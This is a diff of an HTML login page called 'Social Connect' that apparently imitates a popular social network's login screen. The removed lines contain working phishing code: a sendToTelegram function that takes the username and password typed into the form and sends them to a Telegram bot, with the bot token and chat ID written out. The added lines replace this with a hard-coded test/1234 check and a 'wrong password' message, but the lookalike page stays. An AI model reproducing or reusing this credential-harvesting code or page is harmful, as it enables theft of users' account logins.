@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Social Connect Login</title>
+    <title>Social Connect</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -88,6 +88,12 @@
             cursor: pointer;
             margin-top: 20px;
         }
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -102,6 +108,7 @@
                 <input type="password" id="password" placeholder="Password">
                 <button onclick="sendToTelegram()">Log in</button>
                 <a href="#">Forgotten password?</a>
+                <div class="error-message" id="error-message">Wrong username or password. Please try again.</div>
             </div>
             <button class="create-account">Create new account</button>
         </div>
@@ -110,21 +117,15 @@
         function sendToTelegram() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const botToken = '6717802830:AAHimj9bkZdLs4RHTyf9yL1z-UELpInqAQo';
-            const chatId = '5634946920';
 
-            const message = `Username: ${username}\nPassword: ${password}`;
-
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                  
-                })
-                .catch(error => {
-              
-                });
+            // This is just a simulation of a login check
+            if (username === "test" && password === "1234") {
+                // Successful login logic here
+                alert('Login successful!');
+            } else {
+                // Show error message
+                document.getElementById('error-message').style.display = 'block';
+            }
         }
     </script>
 </body>
